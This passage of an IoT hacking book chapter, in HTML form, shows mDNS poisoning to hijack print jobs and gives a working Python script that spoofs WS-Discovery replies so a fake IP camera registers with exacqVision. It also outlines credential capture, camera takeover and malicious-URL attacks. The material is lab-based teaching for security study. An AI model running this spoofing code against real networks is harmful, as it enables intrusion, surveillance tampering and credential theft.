+Poisoned answer sent to 192.168.10.199 for name _universal._sub._ipp._tcp.local.
+Poisoned answer sent to 192.168.10.219 for name test._ipps._tcp.local.
+Poisoned answer sent to 192.168.10.199 for name _universal._sub._ipp._tcp.local.</code></pre>
+<p>We try to automatically grab the print job from the victim client, getting it to connect to us instead of the real printer by sending seemingly legitimate mDNS traffic. Our mDNS poisoner replies to the victim client 192.168.10.199, telling it that the attacker holds the <code>_universal._sub._ipp._tcp.local </code>name. The mDNS poisoner also tells the legitimate printer server (192.168.10.219) that the attacker holds the <code>test._ipps._tcp.local</code> name. </p>
+<p>Remember that this is the name that the legitimate print server was advertising. Our poisoner, a simple proof of concept script at this stage, doesn’t distinguish between targets; rather, it indiscriminately poisons every request it sees. </p>
+<p><span epub:type="pagebreak" title="145" id="Page_145"/>Here is the ippserver that emulates a printer server:</p>
+<pre><code>root@kali:~/tmp# <b>ls</b>
+root@kali:~/tmp# <b>ippserver test -d . -k -v</b>
+Listening on port 8000.
+Ignore Avahi state 2.
+printer-more-info=https://kali:8000/
+printer-supply-info-uri=https://kali:8000/supplies
+printer-uri="ipp://kali:8000/ipp/print"
+Accepted connection from 192.168.10.199
+192.168.10.199 Starting HTTPS session.
+192.168.10.199 Connection now encrypted.
+…</code></pre>
+<p>With the mDNS poisoner running, the client (192.168.10.199) will connect to the attacker’s ippserver instead of the legitimate printer (192.168.10.219) to send the print job.</p>
+<p>But this attack doesn’t automatically forward the print job or document to the real printer. Note that in this scenario, the Bonjour implementation of mDNS/DNS-SD seems to query the <code>_universal</code> name every time the user tries to print something from the MacBook, and it would need to be poisoned as well. The reason is that our MacBook was connected to our lab via Wi-Fi, and macOS was trying to use AirPrint, a macOS feature for printing via Wi-Fi. The <code>_universal</code> name is associated with AirPrint.</p>
+<h2 id="h1-500907c06-0003">Exploiting WS-Discovery </h2>
+<p class="BodyFirst">The <em>Web Services Dynamic Discovery Protocol </em>(<em>WS-Discovery</em>) is a multicast discovery protocol that locates services on a local network. Have you ever wondered what could happen if you pretended to be an IP camera by imitating its network behavior and attacking the server that manages it? Corporate networks, on which a large number of cameras reside, often rely on <em>video management servers</em>, software that lets system administrators and operators remotely control the devices and view their video feed through a centralized interface. </p>
+<p>Most modern IP cameras support <em>ONVIF</em>, an open industry standard developed to let physical, IP-based security products work with each other, including video surveillance cameras, recorders, and associated software. It’s an open protocol that surveillance software developers can use to interface with ONVIF-compliant devices regardless of the device’s manufacturer. One of its features is <em>automatic device discovery</em>, which it typically carries out using WS-Discovery. In this section, we’ll explain how WS-Discovery works, create a proof of concept Python script for exploiting inherent protocol vulnerabilities, create a fake IP camera on the local network, and discuss other attack vectors.</p>
+<h3 id="h2-500907c06-0011">How WS-Discovery Works</h3>
+<p class="BodyFirst">Without getting into too many details, we’ll provide a brief overview of how WS-Discovery works. In WS-Discovery terminology, a <em>Target Service</em> is an endpoint that makes itself available for discovery, whereas a <em>Client</em> is an <span epub:type="pagebreak" title="146" id="Page_146"/>endpoint that searches for Target Services. Both use SOAP queries over UDP to the 239.255.255.250 multicast address with the destination UDP port 3702. <a id="figureanchor6-13" href="#figure6-13">Figure 6-13</a> represents the message exchanges between the two.</p>
+<figure>
+<img src="Images/f06013.png" alt="f06013" width="750" height="618"/>
+<figcaption><p><a id="figure6-13">Figure 6-13:</a>  WS-Discovery message exchanges between a Target Service and a Client</p></figcaption>
+</figure>
+<p>A Target Service sends a multicast <em>Hello </em><span class="CodeAnnotation">1</span> when it joins a network. The Target Service can receive a multicast <em>Probe </em><span class="CodeAnnotation">2</span>, a message sent by a Client searching for a Target Service by <em>Type</em>, at any time. The Type is an identifier for the endpoint. For example, an IP camera could have NetworkVideoTransmitter as a Type. It might also send a unicast <em>Probe Match</em><span class="CodeAnnotation">3</span> if the Target Service matches a Probe (other matching Target Services might also send unicast Probe Matches). Similarly, a Target Service might receive a multicast <em>Resolve</em><span class="CodeAnnotation">4</span> at any time, a message sent by a Client searching for a Target by name, and send a unicast <em>Resolve Match</em><span class="CodeAnnotation">5</span> if it’s the target of a Resolve. Finally, when a Target Service leaves a network, it makes an effort to send a multicast <em>Bye </em><span class="CodeAnnotation">6</span>. </p>
+<p>A Client mirrors the Target Service messages. It listens to the multicast Hello, might Probe to find Target Services or Resolve to find a particular Target Service, and listens to the multicast Bye. We mostly want to focus on the second and third steps <span class="CodeAnnotation">2</span><span class="CodeAnnotation">3</span> for the attack we’ll perform in this section.</p>
+<h3 id="h2-500907c06-0012">Faking Cameras on Your Network</h3>
+<p class="BodyFirst">We’ll first set up a test environment with IP camera management software on a virtual machine, and then use a real network camera to <span epub:type="pagebreak" title="147" id="Page_147"/>capture packets and analyze how it interacts with the software through WS-Discovery in practice. Then we’ll create a Python script that will imitate the camera with the goal of attacking the camera management software. </p>
+<h4 id="h3-500907c06-0011">Setting up</h4>
+<p class="BodyFirst">We’ll demonstrate this attack using an earlier version (version 7.8) of <em>exacqVision</em>, a well-known tool for IP camera management. You could also use a similar free tool, such as Camlytics, iSpy, or any kind of camera management software that uses WS-Discovery. We’ll host the software on a virtual machine with the IP address 192.168.10.240. The actual network camera we’ll be imitating has the IP address 192.168.10.245. You can find the version of exacqVision we’re using at <a href="https://www.exacq.com/reseller/legacy/?file=Legacy/index.html/" class="LinkURL">https://www.exacq.com/reseller/legacy/?file=Legacy/index.html/</a><em>.</em></p>
+<p>Install the exacqVision server and client on a Windows 7 system hosted on VMware, and then start the exacqVision client. It should connect locally to the corresponding server; the client acts as a user interface to the server, which should have started as a background service on the system. Then we can start discovering network cameras. On the Configuration page, click <b>exacqVision Server</b><span class="MenuArrow">▶</span><b>Configure System</b><span class="MenuArrow">▶</span><b>Add IP Cameras</b>, and then click the <b>Rescan Network</b> button (<a id="figureanchor6-14" href="#figure6-14">Figure 6-14</a>).</p>
+<figure>
+<img src="Images/f06014.png" alt="f06014" width="750" height="353"/>
+<figcaption><p><a id="figure6-14">Figure 6-14:</a> exacqVision client interface for discovering new network cameras using WS-Discovery</p></figcaption>
+</figure>
+<p>Doing so will send a WS-Discovery Probe (message 2 in <a href="#figure6-14">Figure 6-14</a>) to the multicast address 239.255.255.250 over UDP port 3702. </p>
+<h4 id="h3-500907c06-0012">Analyzing WS-Discovery Requests and Replies in Wireshark</h4>
+<p class="BodyFirst">As an attacker, how can we impersonate a camera on the network? It’s fairly easy to understand how typical WS-discovery requests and replies work by experimenting with an off-the shelf camera, such as Amcrest, as shown in this section. In Wireshark, start by enabling the “XML over UDP” dissector by clicking <b>Analyze</b> in the menu bar. Then click <b>Enabled Protocols</b>. Search for “udp” and select the <b>XML over UDP </b>box (<a id="figureanchor6-15" href="#figure6-15">Figure 6-15</a>).</p>
+<span epub:type="pagebreak" title="148" id="Page_148"/><figure>
+<img src="Images/f06015.png" alt="f06015" width="725" height="257"/>
+<figcaption><p><a id="figure6-15">Figure 6-15:</a> Selecting the XML over UDP dissector in Wireshark</p></figcaption>
+</figure>
+<p>Next, activate Wireshark on the virtual machine that runs the exacqVision server and capture the Probe Match reply (message 3 in 9) from the Amcrest camera to the WS-Discovery Probe. We can then right-click the packet and click <b>Follow </b><span class="MenuArrow">▶</span><b>UDP stream</b>. We should see the entire SOAP/XML request. We’ll need this request value in the next section as we develop our script; we’ll paste it into the <code>orig_buf</code> variable in <a id="listinganchor6-4" href="#listing6-4">Listing 6-4</a>.</p>
+<p><a id="figureanchor6-16" href="#figure6-16">Figure 6-16</a> shows the output of the WS-Discovery Probe in Wireshark. The exacqVision client outputs this information whenever it scans the network for new IP cameras. </p>
+<figure>
+<img src="Images/f06016.png" alt="f06016" width="678" height="750"/>
+<figcaption><p><a id="figure6-16">Figure 6-16:</a> The WS-Discovery Probe from exacqVision, output by Wireshark</p></figcaption>
+</figure>
+<p><span epub:type="pagebreak" title="149" id="Page_149"/>The most important part of this probe is the <code>MessageID</code> UUID (highlighted), because this needs to be included in the Probe Match reply. (You can read more about this in the official WS-Discovery specification at <em>/s:Envelope/s:Header/a:RelatesTo MUST be the value of the [message id] property [WS-Addressing] of the Probe</em>.)</p>
+<p><a id="figureanchor6-17" href="#figure6-17">Figure 6-17</a> shows the Probe Match reply from the real Amcrest IP camera.</p>
+<figure>
+<img src="Images/f06017.png" alt="f06017" width="750" height="379"/>
+<figcaption><p><a id="figure6-17">Figure 6-17:</a> WS-Discovery Probe Match reply from an Amcrest IP camera on the network. Notice that the <code>RelatesTo</code> UUID is the same as the <code>MessageID</code> UUID that exacqVision sent.</p></figcaption>
+</figure>
+<p>The <code>RelatesTo</code> field contains the same UUID as the one in the <code>MessageID</code> of the XML payload that the exacqVision client sent. </p>
+<h4 id="h3-500907c06-0013">Emulating a Camera on the Network</h4>
+<p class="BodyFirst">Now we’ll write a Python script that emulates a real camera on the network with the intent of attacking the exacqVision software and taking the place of the real camera. We’ll use Amcrest’s Probe Match reply to exacqVision as the foundation for creating our attacking payload. We need to create a listener on the network that receives the WS-Discovery Probe from exacqVision, extracts the MessageID from it, and uses it to finalize our attacking payload as a WS Probe Match reply. </p>
+<p>The first part of our code imports necessary Python modules and defines the variable that holds the original WS-Discovery Probe Match reply from Amcrest, as shown in <a href="#listing6-4">Listing 6-4</a>.</p>
+<pre><code>#!/usr/bin/env python
+import socket
+import struct
+import sys
+import uuid
+
+<span epub:type="pagebreak" title="150" id="Page_150"/>buf = ""
+orig_buf = '''&lt;?xml version="1.0" encoding="utf-8" standalone="yes" ?&gt;&lt;s:Envelope <span class="CodeAnnotation">1</span>      
+&gt;\
+&lt;s:Header&gt;&lt;a:MessageID&gt;urn:uuid:_MESSAGEID_&lt;/a:MessageID&gt;&lt;a:To&gt;urn:schemas-xmlsoap-org:ws:2005:04:discovery&lt;/a:To&gt;&lt;a:Action&gt;http://schemas.xmlsoap.org/ws/2005/04/discovery/ProbeMatches\ <span class="CodeAnnotation">2</span>
+&lt;/a:Action&gt;&lt;a:RelatesTo&gt;urn:uuid:_PROBEUUID_&lt;/a:RelatesTo&gt;&lt;/s:Header&gt;&lt;s:Body&gt;&lt;d:ProbeMatches&gt;&lt;d:ProbeMatch&gt;&lt;a:EndpointReference&gt;&lt;a:Address&gt;uuid:1b77a2db-c51d-44b8-bf2d-418760240ab6&lt;/a:Address&gt;&lt;/a:EndpointReference&gt;&lt;d:Types&gt;dn:NetworkVideoTransmitter <span class="CodeAnnotation">3</span>
+tds:Device&lt;/d:Types&gt;&lt;d:Scopes&gt;onvif://www.onvif.org/location/country/china \ 
+ onvif://www.onvif.org/name/Amcrest \ <span class="CodeAnnotation">4</span>
+ onvif://www.onvif.org/hardware/IP2M-841B \
+ onvif://www.onvif.org/Profile/Streaming \
+ onvif://www.onvif.org/type/Network_Video_Transmitter \
+ onvif://www.onvif.org/extension/unique_identifier&lt;/d:Scopes&gt;\
+&lt;d:XAddrs&gt;http://192.168.10.10/onvif/device_service&lt;/d:XAddrs&gt;&lt;d:MetadataVersion&gt;1&lt;/d:MetadataVersion&gt;&lt;/d:ProbeMatch&gt;&lt;/d:ProbeMatches&gt;&lt;/s:Body&gt;&lt;/s:Envelope&gt;'''</code></pre>
+<p class="CodeListingCaption"><a id="listing6-4">Listing 6-4:</a> Module imports and the definition of the original WS-Discovery Probe Match reply from the Amcrest camera</p>
+<p>We start with the standard Python shebang line to make sure the script can run from the command line without specifying the full path of the Python interpreter, as well as the necessary module imports. Then we create the <code>orig_buf</code> variable <span class="CodeAnnotation">1</span>, which holds the original WS-Discovery reply from Amcrest as a string. Recall from the previous section that we pasted the XML request into the variable after capturing the message in Wireshark. We create a placeholder<code> _MESSAGEID_</code><span class="CodeAnnotation">2</span>. We’ll replace this with a new unique UUID that we’ll generate every time we receive a packet. Similarly, the <code>_PROBEUUID_</code><em> </em><span class="CodeAnnotation">3</span><em> </em>will contain the UUID as extracted from the WS-Discovery Probe at runtime. We have to extract it every time we receive a new WS-Discovery Probe from exacqVision. The <code>name</code> portion <span class="CodeAnnotation">4</span> of the XML payload is a good place to fuzz with malformed input, because we saw that the <code>Amcrest</code> name appears in the client’s listing of cameras and will thus have to first be parsed by the software internally. </p>
+<p>The next part of the code, in <a id="listinganchor6-5" href="#listing6-5">Listing 6-5</a>, sets up the network sockets. Place it immediately after the code in <a href="#listing6-3">Listing 6-3</a>.</p>
+<pre><code>sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
+sock.setsockopt(socket.SOL_SOCKET, <span class="CodeAnnotation">1</span>socket.SO_REUSEADDR, 1)
+sock.bind(('239.255.255.250', 3702))
+mreq = struct.pack("=4sl", socket.inet_aton(<span class="CodeAnnotation">2</span>"239.255.255.250"), socket.INADDR_ANY)
+sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)</code></pre>
+<p class="CodeListingCaption"><a id="listing6-5">Listing 6-5:</a> Setting up the network sockets</p>
+<p>We create a UDP socket and set the <code>SO_REUSEADDR</code> socket option <span class="CodeAnnotation">1</span> that lets the socket bind to the same port whenever we restart the script. Then we bind to the multicast address 239.255.255.250 on port 3702, because these are the standard multicast address and default port used in <span epub:type="pagebreak" title="151" id="Page_151"/>WS-Discovery. We also have to tell the kernel that we’re interested in receiving network traffic directed to 239.255.255.250 by joining that multicast group address <span class="CodeAnnotation">2</span>. </p>
+<p><a id="listinganchor6-6" href="#listing6-6">Listing 6-6</a> shows the final part of our code, which includes the main loop.</p>
+<pre><code>  while True:
+    print("Waiting for WS-Discovery message...\n", file=sys.stderr)
+    data, addr = sock.recvfrom(1024) <span class="CodeAnnotation">1</span>
+    if data:
+      server_addr = addr[0] <span class="CodeAnnotation">2</span>
+      server_port = addr[1]
+      print('Received from: %s:%s' % (server_addr, server_port), file=sys.stderr)
+      print('%s' % (data), file=sys.stderr)
+      print("\n", file=sys.stderr)
+
+      # do not parse any further if this is not a WS-Discovery Probe
+      if "Probe" not in data: <span class="CodeAnnotation">3</span>
+        continue
+
+      # first find the MessageID tag
+      m = data.find("MessageID") <span class="CodeAnnotation">4</span>
+      # from that point in the buffer, continue searching for "uuid" now
+      u = data[m:-1].find("uuid")
+      num = m + u + len("uuid:")
+      # now get where the closing of the tag is
+      end = data[num:-1].find("&lt;")
+      # extract the uuid number from MessageID
+      orig_uuid = data[num:num + end]
+      print('Extracted MessageID UUID %s' % (orig_uuid), file=sys.stderr)
+
+      # replace the _PROBEUUID_ in buffer with the extracted one
+      buf = orig_buf
+      buf = buf.replace("_PROBEUUID_", orig_uuid) <span class="CodeAnnotation">5</span>
+      # create a new random UUID for every packet
+      buf = buf.replace("_MESSAGEID_", str(uuid.uuid4())) <span class="CodeAnnotation">6</span>
+
+      print("Sending WS reply to %s:%s\n" % (server_addr, server_port), file=sys.stderr)
+
+      udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) <span class="CodeAnnotation">7</span>
+      udp_socket.sendto(buf, (server_addr, server_port))</code></pre>
+<p class="CodeListingCaption"><a id="listing6-6">Listing 6-6:</a> The main loop, which receives a WS-Discovery Probe message, extracts the <code>MessageID</code>, and sends the attacking payload</p>
+<p>The script enters an infinite loop in which it listens for WS-Discovery Probe messages <span class="CodeAnnotation">1</span> until we stop it (<span class="KeyCaps">CTRL</span>-C will exit the loop on Linux). If we receive a packet that contains data, we get the sender’s IP address and port <span class="CodeAnnotation">2</span> and save them in the variables <code>server_addr</code> and <code>server_port</code>, respectively. We then check whether the string <code>"Probe"</code><span class="CodeAnnotation">3</span> is included inside the received packet; if it is, we assume this packet is a WS-Discovery Probe. Otherwise, we don’t do anything else with the packet. </p>
+<p>Next, we try to find and extract the UUID from the <code>MessageID</code> XML tag without using any part of the XML library (because this would create <span epub:type="pagebreak" title="152" id="Page_152"/>unnecessary overhead and complicate this simple operation), relying only on basic string manipulation <span class="CodeAnnotation">4</span>. We replace the <code>_PROBEUUID_ </code>placeholder from <a href="#listing6-3">Listing 6-3</a> with the extracted UUID <span class="CodeAnnotation">5</span> and create a new random UUID to replace the <code>_MESSAGE_ID</code><em> </em>placeholder <span class="CodeAnnotation">6</span>. Then we send the UDP packet back to the sender <span class="CodeAnnotation">7</span>. </p>
+<p>Here is an example run of the script against the exacqVision software:</p>
+<pre><code>root@kali:~/zeroconf/ws-discovery# python3 exacq-complete.py 
+Waiting for WS-Discovery message...
+Received from: 192.168.10.169:54374
+&lt;?xml version="1.1" encoding="utf-8"?&gt;&lt;Envelope  &gt;&lt;Header&gt;&lt;wsa:MessageID &gt;urn:uuid:2ed72754-2c2f-4d10-8f50-79d67140d268&lt;/wsa:MessageID&gt;&lt;wsa:To &gt;urn:schemas-xmlsoap-org:ws:2005:04:discovery&lt;/wsa:To&gt;&lt;wsa:Action &gt;http://schemas.xmlsoap.org/ws/2005/04/discovery/Probe&lt;/wsa:Action&gt;&lt;/Header&gt;&lt;Body&gt;&lt;Probe xmlns:xsi=http://www.w3.org/2001/XMLSchema-instance xmlns:xsd=http://www.w3.org/2001/XMLSchema &gt;&lt;Types&gt;dn:NetworkVideoTransmitter&lt;/Types&gt;&lt;Scopes /&gt;&lt;/Probe&gt;&lt;/Body&gt;&lt;/Envelope&gt;
+Extracted MessageID UUID 2ed72754-2c2f-4d10-8f50-79d67140d268
+Sending WS reply to 192.168.10.169:54374
+Waiting for WS-Discovery message...</code></pre>
+<p>Notice that every time you run the script, the MessageID UUID will be different. We leave it as an exercise for you to print the attacking payload and verify that same UUID appears in the <code>RelatesTo </code>field inside it.</p>
+<p>In the exacqClient interface, our fake camera appears in the list of devices, as shown in <a id="figureanchor6-18" href="#figure6-18">Figure 6-18</a>.</p>
+<figure>
+<img src="Images/f06018.png" alt="f06018" width="750" height="137"/>
+<figcaption><p><a id="figure6-18">Figure 6-18:</a> Our fake camera appears on the exacqClient list of IP cameras.</p></figcaption>
+</figure>
+<p>In the next section, we’ll explore what you could accomplish once you’ve been registered as a camera.</p>
+<h3 id="h2-500907c06-0013">Crafting WS-Discovery Attacks</h3>
+<p class="BodyFirst">What types of attacks can you conduct by abusing this simple discovery mechanism? First, you can attack the video management software through this vector, because XML parsers are notorious for bugs that lead to memory corruption vulnerabilities. Even if the server doesn’t have any other exposed listening port, you could feed it malformed input through WS-Discovery. </p>
+<p><span epub:type="pagebreak" title="153" id="Page_153"/>A second attack would have two steps. First, cause a denial of service on a real IP camera so it loses connection to the video server. Second, send WS-Discovery information that makes your fake camera look like the legitimate, disconnected one. In that case, you might be able to fool the server’s operator into adding the fake camera to the list of cameras that the server manages. Once added, you can feed the server with artificial video input. </p>
+<p>In fact, in some cases you could carry out the previous attack without even causing a denial of service in the real IP camera. You’d just have to send the WS-Discovery Probe Match response to the video server before the real camera sends it. In that case, and assuming the information is identical or similar enough (replicating the Name, Type, and Model fields from the real camera is enough most times), the real camera won’t even appear in the management software if you’ve successfully taken its place.</p>
+<p>Third, if the video software uses an insecure authentication to the IP camera (for example, HTTP basic authentication), it’s possible to capture the credentials. An operator who adds your fake camera will type in the same username and password as the original one. In that case, you might be able to capture the credentials as the server attempts to authenticate against what it assumes is the real one. Because password reuse is a common problem, it’s likely that other cameras on the network use the same password, especially if they’re of the same model or vendor.</p>
+<p>A fourth attack could be to include malicious URLs in the WS-Discovery Match Probe’s fields. In some cases, the Match Probe is displayed to the user, and the operator might be tempted to visit the links. </p>
+<p>Additionally, the WS-Discovery standard includes a provision for “Discovery Proxies.” These are essentially web servers that you could leverage to operate WS-Discovery remotely, even across the internet. This means that the attacks described here could potentially take place without the adversary being positioned on the same local network.</p>
+<h2 id="h1-500907c06-0004">Conclusion</h2>
+<p class="BodyFirst">In this chapter, we analyzed UPnP, WS-Discovery, and mDNS and DNS-SD, all of which are common zero-configuration network protocols in IoT ecosystems. We described how to attack an insecure UPnP server on OpenWrt to punch holes in the firewall, and then discussed how to exploit UPnP over WAN interfaces. Next, we analyzed how mDNS and DNS-SD work and how you can abuse them, and we built an mDNS poisoner in Python. Then we inspected WS-Discovery and how to exploit it to conduct a variety of attacks on IP camera management servers. Almost all of these attacks rely on the inherent trust that these protocols put on participants in the local network, favoring automation over security. </p>
+</section>
+</div></body></html>
